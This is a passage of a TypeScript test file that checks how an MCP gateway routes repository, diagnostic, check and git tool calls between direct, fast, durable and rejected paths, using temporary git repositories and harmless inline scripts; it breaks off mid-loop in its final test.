import { describe, expect, test, beforeEach, afterEach } from 'bun:test';
import { createHash } from 'crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { spawnSync } from 'child_process';
import {
  classifyGatewayExecutionPath,
  gatewayRouteBehaviorSnapshot,
  routeDurableMcpCall,
} from '../../src/runtime/gateway/mcp/router';
import { createMcpToolContext } from '../../src/cli/mcp/server';
import { callMultiRepositoryTool } from '../../src/cli/mcp/multi-repository';
import { ensureControllerHome } from '../../src/cli/repositories/controller-home';
import { registerRepository } from '../../src/cli/repositories/registry';
import { listExecutionJobs } from '../../src/runtime/execution/jobs/store';
import { listLocalBridgeJobSnapshots } from '../../src/cli/local-bridge/job-store';
import { callRepositoryTool } from '../../src/cli/mcp/repository-tools';
import { callExecutionTool } from '../../src/runtime/gateway/mcp/execution-tools';
import { callRuntimeTool } from '../../src/runtime/gateway/mcp/runtime-tools';
import { callProcessTool } from '../../src/runtime/gateway/mcp/process-tools';
import { classifyRepositoryCommand } from '../../src/cli/repositories/command-classifier';
import { assessWorkMode } from '../../src/cli/controller/work-mode';
import { routeExecution, isFastEligibleTool } from '../../src/runtime/execution/thin-harness';
import { listProcessRecords } from '../../src/runtime/execution/process-runtime/store';
import { getProcessHandle, waitForProcess } from '../../src/runtime/execution/process-runtime/runtime';
import { runReadOnlyDiagnosticViaProcessRuntime } from '../../src/runtime/diagnostics/process-facade';
import {
  applyEditOperations,
  beginEditSession,
  getEditSession,
} from '../../src/cli/editing/edit-session';
import { getMcpPolicy } from '../../src/cli/mcp/policy';

function git(root: string, args: string[]): void {
  const result = spawnSync('git', ['-C', root, ...args], { encoding: 'utf-8' });
  if (result.status !== 0) throw new Error(result.stderr || `git ${args.join(' ')} failed`);
}

function fixture() {
  const root = mkdtempSync(join(tmpdir(), 'thin-gw-route-'));
  const controllerHome = join(root, 'controller');
  const repoRoot = join(root, 'repo');
  mkdirSync(controllerHome, { recursive: true });
  mkdirSync(join(repoRoot, 'src'), { recursive: true });
  mkdirSync(join(repoRoot, '.forge'), { recursive: true });
  git(repoRoot, ['init', '-b', 'main']);
  git(repoRoot, ['config', 'user.name', 'Test']);
  git(repoRoot, ['config', 'user.email', 'test@example.com']);
  writeFileSync(join(repoRoot, 'README.md'), 'gateway routing fixture\n');
  writeFileSync(join(repoRoot, 'src', 'lib.ts'), 'export const n = 1;\n');
  writeFileSync(join(repoRoot, '.forge', 'checks.json'), JSON.stringify({
    version: 1,
    checks: {
      slow: {
        description: 'slow managed check',
        command: [process.execPath, '-e', 'setTimeout(() => { console.log("slow-ok"); process.exit(0); }, 1200)'],
        timeoutMs: 10_000,
      },
    },
  }, null, 2));
  git(repoRoot, ['add', '.']);
  git(repoRoot, ['commit', '-m', 'init']);
  ensureControllerHome(controllerHome);
  const repository = registerRepository({ path: repoRoot, controllerHome, displayName: 'gw-route' });
  const ctx = createMcpToolContext({
    controllerHome,
    profile: 'controller',
    repo: repoRoot,
  });
  return { root, controllerHome, repoRoot, repository, ctx };
}

const roots: string[] = [];

beforeEach(() => {
  // no-op; fixtures cleaned in afterEach
});

afterEach(() => {
  while (roots.length > 0) rmSync(roots.pop()!, { recursive: true, force: true });
});

describe('Gateway Thin Harness routing before ExecutionJob', () => {
  test('publishes a deterministic fingerprint from the real classifier behavior matrix', () => {
    const first = gatewayRouteBehaviorSnapshot();
    const second = gatewayRouteBehaviorSnapshot();
    expect(first).toEqual(second);
    expect(first.fingerprint).toMatch(/^[a-f0-9]{64}$/);
    expect(first.probeCount).toBe(first.probes.length);
    const paths = Object.fromEntries(first.probes.map((probe) => [probe.id, probe.path]));
    expect(paths).toMatchObject({
      'hot-read': 'direct',
      'isolated-read-diagnostic': 'fast',
      'readonly-command': 'fast',
      'managed-local-command': 'fast',
      'focused-check': 'fast',
      'release-check': 'durable',
      'interactive-write': 'direct',
      'external-controller': 'durable',
      'unknown-tool': 'reject',
    });
  });

  test('classifies Fast readonly argv before durable path', () => {
    const classification = classifyGatewayExecutionPath('repository_command_execute', {
      command: ['git', 'status', '--short'],
      timeout_ms: 5_000,
    });
    expect(classification.path).toBe('fast');
    expect(classification.decision?.mode).toBe('fast');
  });

  test('routes bounded runtime maintenance writes directly but preserves explicit async durable routing', () => {
    expect(classifyGatewayExecutionPath('runtime_maintenance_apply', {
      action_id: 'full_maintenance_pass',
      confirm_maintenance: true,
      authorization: 'full_maintenance_pass',
    })).toMatchObject({ path: 'direct', reasons: ['bounded_direct_control_write'] });
    expect(classifyGatewayExecutionPath('runtime_maintenance_apply', {
      action_id: 'full_maintenance_pass',
      confirm_maintenance: true,
      authorization: 'full_maintenance_pass',
      apply_mode: 'async',
    }).path).toBe('durable');
  });

  test('async / durable request still forces durable', () => {
    expect(classifyGatewayExecutionPath('repository_command_execute', {
      command: ['git', 'status'],
      apply_mode: 'async',
    }).path).toBe('durable');
    expect(classifyGatewayExecutionPath('repository_command_execute', {
      command: ['bun', 'test'],
      mode: 'durable',
    }).path).toBe('durable');
    // Ordinary run_check uses Process Runtime (fast classification) — not Durable Job.
    expect(classifyGatewayExecutionPath('run_check', {
      check_id: 'typecheck',
    }).path).toBe('fast');
    // Explicit durable / release checks remain durable.
    expect(classifyGatewayExecutionPath('run_check', {
      check_id: 'typecheck',
      mode: 'durable',
    }).path).toBe('durable');
    expect(classifyGatewayExecutionPath('run_check', {
      check_id: 'check:release',
    }).path).toBe('durable');
  });

  test('MCP routeDurableMcpCall does not create ExecutionJob for Fast git status', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    const localBefore = listLocalBridgeJobSnapshots(fx.repoRoot).length;

    const durable = await routeDurableMcpCall(fx.ctx, 'repository_command_execute', {
      repo_id: fx.repository.repoId,
      command: ['git', 'status', '--short'],
      timeout_ms: 5_000,
    });
    // Fast path must return undefined so the MCP server falls through to direct repository tools.
    expect(durable).toBeUndefined();

    const direct = await callRepositoryTool(fx.controllerHome, 'repository_command_execute', {
      repo_id: fx.repository.repoId,
      command: ['git', 'status', '--short'],
      timeout_ms: 5_000,
      include_latency_breakdown: true,
    });
    expect(direct?.isError).not.toBe(true);
    const payload = direct?.structuredContent as Record<string, unknown>;
    // Unified Process Runtime Direct is an acceptable Fast Path successor for readonly commands.
    expect(['fast', 'process_direct', 'process_managed']).toContain(String(payload.mode));
    expect(['fast', 'process_direct', 'process_managed']).toContain(String(payload.path));
    expect((payload.durableSideEffects as { executionJobCount?: number } | undefined)?.executionJobCount ?? 0).toBe(0);
    expect((payload.durableSideEffects as { localJobCount?: number } | undefined)?.localJobCount ?? 0).toBe(0);
    expect((payload.durableSideEffects as { workerSpawnCount?: number } | undefined)?.workerSpawnCount ?? 0).toBe(0);

    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
    expect(listLocalBridgeJobSnapshots(fx.repoRoot).length).toBe(localBefore);
  });

  test('registered controller reads fall through directly without Job or Process creation', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const created = await callMultiRepositoryTool(fx.ctx, 'create_issue', {
      title: 'Direct read routing',
      kind: 'feature',
      summary: 'Read routing fixture',
      tasks: [{ title: 'Inspect', objective: 'Read state' }],
    });
    const issueId = String((created.structuredContent as { id?: string }).id ?? '');
    expect(issueId).toBeTruthy();
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    const processesBefore = listProcessRecords(fx.controllerHome, fx.repository.repoId).length;

    for (const [tool, args] of [
      ['get_project_progress', {}],
      ['get_project_board', {}],
      ['get_issue', { issue_id: issueId }],
    ] as const) {
      const durable = await routeDurableMcpCall(fx.ctx, tool, args);
      expect(durable).toBeUndefined();
      const direct = await callMultiRepositoryTool(fx.ctx, tool, args);
      expect(direct.isError).not.toBe(true);
    }

    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
    expect(listProcessRecords(fx.controllerHome, fx.repository.repoId).length).toBe(processesBefore);
  });

  test('registered read-only isolated tools use Process Runtime without durable side effects', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    const processesBefore = listProcessRecords(fx.controllerHome, fx.repository.repoId).length;

    for (const [index, [tool, args]] of ([
      ['workflow_watchdog_report', { repo_id: fx.repository.repoId, include_processes: false }],
      ['runtime_maintenance_status', { repo_id: fx.repository.repoId }],
      ['runtime_cleanup_preview', { repo_id: fx.repository.repoId, include_temp_dirs: false }],
      ['runtime_performance_diagnostics', {
        repo_id: fx.repository.repoId,
        include_processes: false,
        include_temp_dirs: false,
      }],
      ['capability_recovery_probe', { repo_id: fx.repository.repoId }],
    ] as const).entries()) {
      const requestId = `diagnostic-${index}`;
      const routed = await routeDurableMcpCall(fx.ctx, tool, { ...args, request_id: requestId }, {
        allowReadOnly: true,
        forceDurable: true,
      });
      expect(routed).toBeDefined();
      expect(routed?.isError).not.toBe(true);
      const payload = routed?.structuredContent as Record<string, unknown>;
      const execution = (payload.diagnosticExecution ?? payload) as Record<string, unknown>;
      expect(['process_direct', 'process_managed']).toContain(String(execution.path ?? payload.path));
      const sideEffects = (execution.durableSideEffects ?? payload.durableSideEffects) as Record<string, number>;
      expect(sideEffects.executionJobCount ?? 0).toBe(0);
      expect(sideEffects.localJobCount ?? 0).toBe(0);
      expect(sideEffects.workerSpawnCount ?? 0).toBe(0);
      expect(sideEffects.projectionUpdateCount ?? 0).toBe(0);
      expect(JSON.stringify(payload)).not.toContain('EXECUTION_JOB_RETIRED');
      if (tool === 'runtime_performance_diagnostics' && payload.diagnosticExecution) {
        expect((payload.runtimeIdentity as { profile?: string }).profile).toBe('controller');
      }
      if (tool === 'capability_recovery_probe' && payload.diagnosticExecution) {
        const capabilities = (payload.recovery as {
          capabilities?: Array<{ id?: string; evidence?: Array<{ details?: Record<string, unknown> }> }>;
        }).capabilities ?? [];
        const contextCapability = capabilities.find((capability) => capability.id === 'context.projection');
        expect(typeof contextCapability?.evidence?.[0]?.details?.stale).toBe('boolean');
      }
      if (tool === 'runtime_cleanup_preview') {
        expect((payload.diagnosticExecution as { path?: string } | undefined)?.path).toBe('process_direct');
      }

      const retry = await routeDurableMcpCall(fx.ctx, tool, { ...args, request_id: requestId }, {
        allowReadOnly: true,
        forceDurable: true,
      });
      const retryPayload = retry?.structuredContent as Record<string, unknown>;
      const processId = String((execution.processId ?? payload.processId) ?? '');
      const retryExecution = (retryPayload.diagnosticExecution ?? retryPayload) as Record<string, unknown>;
      expect(String((retryExecution.processId ?? retryPayload.processId) ?? '')).toBe(processId);
    }

    const managed = await routeDurableMcpCall(fx.ctx, 'runtime_cleanup_preview', {
      repo_id: fx.repository.repoId,
      include_temp_dirs: false,
      apply_mode: 'async',
      request_id: 'diagnostic-managed',
    }, { allowReadOnly: true, forceDurable: true });
    expect(managed?.isError).not.toBe(true);
    const managedPayload = managed?.structuredContent as Record<string, unknown>;
    expect(managedPayload.path).toBe('process_managed');
    const managedProcessId = String(managedPayload.processId ?? '');
    expect(managedProcessId).toBeTruthy();
    expect((managedPayload.processPointers as { wait?: { tool?: string } }).wait?.tool).toBe('process_wait');
    const waited = await callProcessTool(fx.ctx, 'process_wait', {
      repo_id: fx.repository.repoId,
      process_id: managedProcessId,
      timeout_ms: 10_000,
    });
    expect(waited?.isError).not.toBe(true);

    const oversized = await runReadOnlyDiagnosticViaProcessRuntime({
      controllerHome: fx.controllerHome,
      repository: fx.repository,
      tool: 'runtime_cleanup_preview',
      args: {
        include_temp_dirs: false,
        request_id: 'diagnostic-oversized',
      },
      inlineMaxBytes: 1,
    });
    expect(oversized.path).toBe('process_managed');
    expect((oversized.result as { available?: boolean }).available).toBe(true);
    expect((oversized.result as { inline?: boolean }).inline).toBe(false);
    expect((oversized.result as { reason?: string }).reason).toBe('result_exceeds_inline_limit');
    expect((oversized.result as { bytes?: number }).bytes ?? 0).toBeGreaterThan(1);
    expect((oversized.result as { inlineLimitBytes?: number }).inlineLimitBytes).toBe(1);

    const conflict = await routeDurableMcpCall(fx.ctx, 'runtime_cleanup_preview', {
      repo_id: fx.repository.repoId,
      include_temp_dirs: true,
      request_id: 'diagnostic-2',
    }, { allowReadOnly: true, forceDurable: true });
    expect(conflict?.isError).toBe(true);
    expect((conflict?.structuredContent as { error?: { code?: string } }).error?.code).toBe('PROCESS_REQUEST_ID_CONFLICT');

    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
    expect(listProcessRecords(fx.controllerHome, fx.repository.repoId).length).toBe(processesBefore + 7);
  });

  test('one repository diagnostic cannot block bounded reads for another repository session', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const secondRoot = join(fx.root, 'repo-two');
    mkdirSync(secondRoot, { recursive: true });
    git(secondRoot, ['init', '-b', 'main']);
    git(secondRoot, ['config', 'user.name', 'Test']);
    git(secondRoot, ['config', 'user.email', 'test@example.com']);
    writeFileSync(join(secondRoot, 'README.md'), 'second repository\n');
    git(secondRoot, ['add', '.']);
    git(secondRoot, ['commit', '-m', 'init']);
    const secondRepository = registerRepository({
      path: secondRoot,
      controllerHome: fx.controllerHome,
      displayName: 'gw-route-two',
    });
    const secondContext = createMcpToolContext({
      controllerHome: fx.controllerHome,
      profile: 'controller',
      repo: secondRoot,
    });
    const slowEntry = join(fx.root, 'slow diagnostic.ts');
    writeFileSync(slowEntry, [
      'setTimeout(() => {',
      '  process.stdout.write(JSON.stringify({ status: "normal", source: "slow-fixture" }));',
      '}, 1200);',
    ].join('\n'));

    const admissionStarted = performance.now();
    const heavy = await runReadOnlyDiagnosticViaProcessRuntime({
      controllerHome: fx.controllerHome,
      repository: fx.repository,
      tool: 'runtime_performance_diagnostics',
      args: {
        request_id: 'cross-repository-slow-diagnostic',
        apply_mode: 'async',
        execution_timeout_ms: 10_000,
      },
      cliInvocation: {
        entry: slowEntry,
        options: {
          runtimeExecutable: process.execPath,
          runtimeKind: 'bun_source',
          sourceRevision: 'slow-fixture-source',
          env: {},
        },
      },
    });
    expect(heavy.path).toBe('process_managed');
    expect(performance.now() - admissionStarted).toBeLessThan(500);

    const routeStarted = performance.now();
    expect(await routeDurableMcpCall(secondContext, 'get_project_board', {
      repo_id: secondRepository.repoId,
    })).toBeUndefined();
    const board = await callMultiRepositoryTool(secondContext, 'get_project_board', {
      repo_id: secondRepository.repoId,
    });
    const readElapsedMs = performance.now() - routeStarted;
    expect(board.isError).not.toBe(true);
    expect(readElapsedMs).toBeLessThan(500);

    const completed = await waitForProcess(
      fx.controllerHome,
      fx.repository.repoId,
      String(heavy.processId),
      { timeoutMs: 10_000 },
    );
    expect(completed.ok).toBe(true);
    expect(completed.stdout).toContain('slow-fixture');
  });

  test('explicit repository identity overrides the session default for isolated diagnostics', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const secondRoot = join(fx.root, 'explicit-repository');
    mkdirSync(secondRoot, { recursive: true });
    git(secondRoot, ['init', '-b', 'main']);
    git(secondRoot, ['config', 'user.name', 'Test']);
    git(secondRoot, ['config', 'user.email', 'test@example.com']);
    writeFileSync(join(secondRoot, 'README.md'), 'explicit repository\n');
    git(secondRoot, ['add', '.']);
    git(secondRoot, ['commit', '-m', 'init']);
    const explicitRepository = registerRepository({
      path: secondRoot,
      controllerHome: fx.controllerHome,
      displayName: 'explicit-repository',
    });

    const routed = await routeDurableMcpCall(fx.ctx, 'runtime_performance_diagnostics', {
      repo_id: explicitRepository.repoId,
      apply_mode: 'async',
      include_processes: false,
      include_temp_dirs: false,
      request_id: 'explicit-repository-diagnostic',
    }, { allowReadOnly: true, forceDurable: true });
    expect(routed?.isError).not.toBe(true);
    const payload = routed?.structuredContent as Record<string, unknown>;
    const processId = String(payload.processId ?? '');
    expect(processId).toBeTruthy();
    expect(getProcessHandle(fx.controllerHome, explicitRepository.repoId, processId)).toBeTruthy();
    expect(getProcessHandle(fx.controllerHome, fx.repository.repoId, processId)).toBeUndefined();
    const completed = await waitForProcess(
      fx.controllerHome,
      explicitRepository.repoId,
      processId,
      { timeoutMs: 10_000 },
    );
    expect(completed.ok).toBe(true);
  });

  test('diagnostic completion remains readable after request timeout and Gateway context recreation', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const slowEntry = join(fx.root, 'late diagnostic.ts');
    writeFileSync(slowEntry, [
      'setTimeout(() => {',
      '  process.stdout.write(JSON.stringify({ status: "normal", terminalReceipt: "late" }));',
      '}, 120);',
    ].join('\n'));

    const started = await runReadOnlyDiagnosticViaProcessRuntime({
      controllerHome: fx.controllerHome,
      repository: fx.repository,
      tool: 'runtime_maintenance_status',
      args: {
        request_id: 'late-diagnostic-terminal-receipt',
        interactive_wait_ms: 5,
        execution_timeout_ms: 10_000,
      },
      cliInvocation: {
        entry: slowEntry,
        options: {
          runtimeExecutable: process.execPath,
          runtimeKind: 'bun_source',
          sourceRevision: 'late-receipt-source',
          env: {},
        },
      },
    });
    expect(started.path).toBe('process_managed');
    expect((started.result as { reason?: string }).reason).toBe('interactive_wait_expired');
    const processId = String(started.processId ?? '');
    expect(processId).toBeTruthy();

    const recreatedContext = createMcpToolContext({
      controllerHome: fx.controllerHome,
      profile: 'controller',
      repo: fx.repoRoot,
    });
    const waited = await callProcessTool(recreatedContext, 'process_wait', {
      repo_id: fx.repository.repoId,
      process_id: processId,
      timeout_ms: 10_000,
    });
    expect(waited?.isError).not.toBe(true);
    const terminal = getProcessHandle(fx.controllerHome, fx.repository.repoId, processId);
    expect(terminal?.completed).toBe(true);
    expect(terminal?.ok).toBe(true);
    expect(terminal?.stdout).toContain('terminalReceipt');
  });

  test('structured local Git mutations use direct local handlers instead of retired ExecutionJob routing', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    const processesBefore = listProcessRecords(fx.controllerHome, fx.repository.repoId).length;

    writeFileSync(join(fx.repoRoot, 'src', 'commit.ts'), 'export const committed = true;\n');
    expect(await routeDurableMcpCall(fx.ctx, 'repository_git_commit', {
      repo_id: fx.repository.repoId,
      message: 'commit structured change',
      paths: ['src/commit.ts'],
    })).toBeUndefined();
    const committed = await callRepositoryTool(fx.controllerHome, 'repository_git_commit', {
      repo_id: fx.repository.repoId,
      message: 'commit structured change',
      paths: ['src/commit.ts'],
    });
    expect(committed?.isError).not.toBe(true);
    expect(((committed?.structuredContent as Record<string, unknown>).commit as { committed?: boolean }).committed).toBe(true);

    git(fx.repoRoot, ['switch', '-c', 'feature/merge-fixture']);
    writeFileSync(join(fx.repoRoot, 'src', 'merge.ts'), 'export const merged = true;\n');
    git(fx.repoRoot, ['add', 'src/merge.ts']);
    git(fx.repoRoot, ['commit', '-m', 'feature merge fixture']);
    git(fx.repoRoot, ['switch', 'main']);

    expect(await routeDurableMcpCall(fx.ctx, 'repository_git_merge_branch', {
      repo_id: fx.repository.repoId,
      branch: 'feature/merge-fixture',
    })).toBeUndefined();
    const merged = await callRepositoryTool(fx.controllerHome, 'repository_git_merge_branch', {
      repo_id: fx.repository.repoId,
      branch: 'feature/merge-fixture',
    });
    expect(merged?.isError).not.toBe(true);
    expect(((merged?.structuredContent as Record<string, unknown>).execution as { ok?: boolean }).ok).toBe(true);

    expect(await routeDurableMcpCall(fx.ctx, 'repository_git_delete_branch', {
      repo_id: fx.repository.repoId,
      branch: 'feature/merge-fixture',
    })).toBeUndefined();
    const deleted = await callRepositoryTool(fx.controllerHome, 'repository_git_delete_branch', {
      repo_id: fx.repository.repoId,
      branch: 'feature/merge-fixture',
    });
    expect(deleted?.isError).not.toBe(true);
    expect(((deleted?.structuredContent as Record<string, unknown>).execution as { ok?: boolean }).ok).toBe(true);

    git(fx.repoRoot, ['switch', '-c', 'feature/finish-fixture']);
    writeFileSync(join(fx.repoRoot, 'src', 'finish.ts'), 'export const finished = true;\n');
    git(fx.repoRoot, ['add', 'src/finish.ts']);
    git(fx.repoRoot, ['commit', '-m', 'feature finish fixture']);

    expect(await routeDurableMcpCall(fx.ctx, 'repository_git_finish_workflow', {
      repo_id: fx.repository.repoId,
      target_branch: 'main',
      delete_branch: true,
    })).toBeUndefined();
    const finished = await callRepositoryTool(fx.controllerHome, 'repository_git_finish_workflow', {
      repo_id: fx.repository.repoId,
      target_branch: 'main',
      delete_branch: true,
    });
    expect(finished?.isError).not.toBe(true);
    expect(((finished?.structuredContent as Record<string, unknown>).finish as { completed?: boolean }).completed).toBe(true);

    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
    expect(listProcessRecords(fx.controllerHome, fx.repository.repoId).length).toBe(processesBefore);
  });

  test('long run_check returns a managed Process Runtime handle without ExecutionJob creation', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;

    const started = await routeDurableMcpCall(fx.ctx, 'run_check', {
      repo_id: fx.repository.repoId,
      check_id: 'slow',
      interactive_wait_ms: 100,
    });

    expect(started?.isError).not.toBe(true);
    const payload = started?.structuredContent as Record<string, unknown>;
    expect(payload.path).toBe('process_managed');
    expect(typeof payload.processId).toBe('string');
    const completed = await waitForProcess(
      fx.controllerHome,
      fx.repository.repoId,
      String(payload.processId),
      { timeoutMs: 10_000 },
    );
    expect(completed.ok).toBe(true);
    expect(completed.exitCode).toBe(0);
    const artifactPath = join(fx.repoRoot, '.ai', 'harness', 'checks', 'controller', 'latest-slow.json');
    expect(existsSync(artifactPath)).toBe(true);
    const artifact = JSON.parse(readFileSync(artifactPath, 'utf8')) as {
      ok: boolean;
      status: number;
      revision?: string;
      completedRevision?: string;
      validatedRevision?: string;
    };
    expect(artifact.ok).toBe(true);
    expect(artifact.status).toBe(0);
    expect(artifact.revision).toBe(artifact.completedRevision);
    expect(artifact.validatedRevision).toBe(artifact.revision);
    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
  });

  test('run_check Process status and persisted failure Artifact agree', async () => {
    const fx = fixture();
    roots.push(fx.root);
    writeFileSync(join(fx.repoRoot, '.forge', 'checks.json'), JSON.stringify({
      version: 1,
      checks: {
        failing: {
          description: 'persisted failing check',
          command: [process.execPath, '-e', 'process.stderr.write("expected-failure\\n"); process.exit(7)'],
          timeoutMs: 10_000,
        },
      },
    }, null, 2));

    const started = await routeDurableMcpCall(fx.ctx, 'run_check', {
      repo_id: fx.repository.repoId,
      check_id: 'failing',
      interactive_wait_ms: 100,
    });
    const payload = started?.structuredContent as Record<string, unknown>;
    const completed = await waitForProcess(
      fx.controllerHome,
      fx.repository.repoId,
      String(payload.processId),
      { timeoutMs: 10_000 },
    );
    expect(completed.ok).toBe(false);
    expect(completed.exitCode).toBe(7);
    const artifact = JSON.parse(readFileSync(
      join(fx.repoRoot, '.ai', 'harness', 'checks', 'controller', 'latest-failing.json'),
      'utf8',
    )) as { ok: boolean; status: number; stderr: string };
    expect(artifact.ok).toBe(false);
    expect(artifact.status).toBe(7);
    expect(artifact.stderr).toContain('expected-failure');
  });

  test('verify_edit_session consumes persisted Process receipts without Local Jobs', async () => {
    const fx = fixture();
    roots.push(fx.root);
    writeFileSync(join(fx.repoRoot, '.forge', 'checks.json'), JSON.stringify({
      version: 1,
      checks: {
        verify: {
          description: 'fast edit verification',
          command: [process.execPath, '-e', 'process.stdout.write("verified")'],
          timeoutMs: 10_000,
        },
      },
    }, null, 2));
    const session = beginEditSession(fx.repoRoot, {
      purpose: 'Process receipt MCP smoke',
      allowedPaths: ['src/**'],
      checks: ['verify'],
    });
    const sourcePath = join(fx.repoRoot, 'src', 'lib.ts');
    const before = readFileSync(sourcePath, 'utf8');
    applyEditOperations(fx.repoRoot, getMcpPolicy('controller', { repoRoot: fx.repoRoot }), session.sessionId, [{
      type: 'replace',
      path: 'src/lib.ts',
      expectedSha256: createHash('sha256').update(before).digest('hex'),
      replacements: [{ oldText: 'n = 1', newText: 'n = 2' }],
    }]);

    const localBefore = listLocalBridgeJobSnapshots(fx.repoRoot).length;
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    await expect(routeDurableMcpCall(fx.ctx, 'verify_edit_session', {
      repo_id: fx.repository.repoId,
      checkout_id: fx.repository.activeCheckoutId,
      session_id: session.sessionId,
      check_ids: [],
      request_id: 'verify-edit-empty-bypass',
    })).rejects.toThrow(/EDIT_CHECK_RECEIPT_REQUIRED_CHECK_MISSING/);
    const requestId = 'verify-edit-receipt-smoke';
    let response = await routeDurableMcpCall(fx.ctx, 'verify_edit_session', {
      repo_id: fx.repository.repoId,
      checkout_id: fx.repository.activeCheckoutId,
      session_id: session.sessionId,
      request_id: requestId,
      interactive_wait_ms: 100,
    });
    let payload = response?.structuredContent as Record<string, unknown>;
    if (payload.completed !== true) {
      const processes = payload.processes as Array<{ processId: string }>;
      expect(processes.length).toBeGreaterThan(0);
      await waitForProcess(fx.controllerHome, fx.repository.repoId, processes[0]!.processId, { timeoutMs: 10_000 });
      response = await routeDurableMcpCall(fx.ctx, 'verify_edit_session', {
        repo_id: fx.repository.repoId,
        checkout_id: fx.repository.activeCheckoutId,
        session_id: session.sessionId,
        request_id: requestId,
        interactive_wait_ms: 100,
      });
      payload = response?.structuredContent as Record<string, unknown>;
    }

    expect(response?.isError).not.toBe(true);
    expect(JSON.stringify(payload)).not.toContain('VERIFY_EDIT_SESSION_LOCAL_JOB_RETIRED');
    expect(payload.path).toBe('process_direct');
    expect(payload.completed).toBe(true);
    expect(payload.ok).toBe(true);
    expect(payload.durableSideEffects).toEqual({
      executionJobCount: 0,
      localJobCount: 0,
      workerSpawnCount: 0,
      projectionUpdateCount: 0,
    });
    const checked = getEditSession(fx.repoRoot, session.sessionId);
    expect(checked.status).toBe('checked');
    expect(checked.checkResults[0]).toEqual(expect.objectContaining({
      checkId: 'verify',
      ok: true,
      processId: expect.any(String),
      receiptId: expect.stringMatching(/^check_receipt_/),
      revision: 1,
    }));
    const processesAfterFirst = listProcessRecords(fx.controllerHome, fx.repository.repoId).length;

    const retried = await routeDurableMcpCall(fx.ctx, 'verify_edit_session', {
      repo_id: fx.repository.repoId,
      checkout_id: fx.repository.activeCheckoutId,
      session_id: session.sessionId,
      request_id: requestId,
      interactive_wait_ms: 100,
    });
    expect(retried?.isError).not.toBe(true);
    expect(listProcessRecords(fx.controllerHome, fx.repository.repoId).length).toBe(processesAfterFirst);
    expect(getEditSession(fx.repoRoot, session.sessionId).checkResults).toEqual(checked.checkResults);
    expect(listLocalBridgeJobSnapshots(fx.repoRoot).length).toBe(localBefore);
    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
  });

  test('run_check preserves Process Runtime request conflicts instead of masking them', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const checksPath = join(fx.repoRoot, '.forge', 'checks.json');
    const localBefore = listLocalBridgeJobSnapshots(fx.repoRoot).length;
    writeFileSync(checksPath, JSON.stringify({
      version: 1,
      checks: {
        stable: {
          description: 'stable request binding check',
          command: [process.execPath, '-e', 'process.stdout.write("first")'],
          timeoutMs: 10_000,
        },
      },
    }, null, 2));

    const first = await routeDurableMcpCall(fx.ctx, 'run_check', {
      repo_id: fx.repository.repoId,
      check_id: 'stable',
      request_id: 'run-check-stable-request',
    });
    expect(first?.isError).not.toBe(true);

    writeFileSync(checksPath, JSON.stringify({
      version: 1,
      checks: {
        stable: {
          description: 'changed request binding check',
          command: [process.execPath, '-e', 'process.stdout.write("changed")'],
          timeoutMs: 10_000,
        },
      },
    }, null, 2));
    await expect(routeDurableMcpCall(fx.ctx, 'run_check', {
      repo_id: fx.repository.repoId,
      check_id: 'stable',
      request_id: 'run-check-stable-request',
    })).rejects.toThrow('PROCESS_REQUEST_ID_CONFLICT');
    expect(listLocalBridgeJobSnapshots(fx.repoRoot).length).toBe(localBefore);
  });

  test('Work execution ownership remains fenced and unknown tools return TOOL_NOT_FOUND', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    const processesBefore = listProcessRecords(fx.controllerHome, fx.repository.repoId).length;

    const work = await callExecutionTool(fx.ctx, 'work_execute', {
      repo_id: fx.repository.repoId,
      work_id: 'WORK-missing',
      command: ['git', 'status', '--short'],
    });
    expect(work?.isError).toBe(true);
    expect(JSON.stringify(work?.structuredContent)).toContain('SESSION');

    const unknown = await routeDurableMcpCall(fx.ctx, 'definitely_not_a_tool', {});
    expect(unknown?.isError).toBe(true);
    expect((unknown?.structuredContent as { error?: { code?: string } }).error?.code).toBe('TOOL_NOT_FOUND');

    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
    expect(listProcessRecords(fx.controllerHome, fx.repository.repoId).length).toBe(processesBefore);
  });

  test('worker-owned repository_command_execute does not create nested Local Job', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const localBefore = listLocalBridgeJobSnapshots(fx.repoRoot).length;
    const response = await callRepositoryTool(fx.controllerHome, 'repository_command_execute', {
      repo_id: fx.repository.repoId,
      command: ['git', 'rev-parse', 'HEAD'],
      timeout_ms: 5_000,
      mode: 'durable',
      __from_durable_worker: true,
      __execution_job_id: 'job-test-1',
    });
    expect(response?.isError).not.toBe(true);
    const payload = response?.structuredContent as Record<string, unknown>;
    expect(payload.path).toBe('durable_worker_inline');
    expect(payload.mode).toBe('durable');
    expect(listLocalBridgeJobSnapshots(fx.repoRoot).length).toBe(localBefore);
    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(0);
  });

  test('argv readonly git branch/worktree/log are Fast eligible', () => {
    for (const command of [
